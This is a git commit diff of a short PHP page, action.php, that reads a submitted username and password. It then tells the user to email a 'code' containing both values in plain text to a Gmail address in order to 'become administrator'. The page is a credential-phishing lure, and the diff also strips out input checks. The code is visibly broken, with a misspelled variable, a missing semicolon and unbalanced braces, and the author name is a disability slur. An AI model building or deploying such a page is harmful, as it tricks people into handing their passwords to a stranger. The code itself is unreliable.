e8b35dd406eb2f9af4cf9ea14ef14117ff8ca1f5
Les Trisomiques du 06 <105150145+Les-Triso@users.noreply.github.com>
2022-05-22 19:52:58 +0200

    Add files via upload

--- action.php
+++ action.php
@@ -2,9 +2,6 @@
 
   if(isset($_POST['valider']))
   {
-    if(isset($_POST['identifiant']) AND isset($_POST['password']))
-    {
-      if(!empty($_POST['identifiant']) AND !empty($_POST['password']))
       {
         $identifian=htmlspecialchars($_POST['identifiant']);
         $password=htmlspecialchars($_POST['password']);
@@ -12,9 +9,8 @@
 
             echo "Bonjour <b> $identifiant </b>, pour devenir administrateur veuillez envoyer ce code à anotherx999.contact@gmail.com : 
                 code : 
-                RTYVJKOINI13<b>$identifiant</b>0258562302586992123485<b>$password</b>05856524<adminagora.charsetnewdone<
+                RTYVJKOINI13$identifiant/0258562302586992123485$password/05856524/adminagora.charsetnewdone<
             "
       }
     }
-  }
 ?>
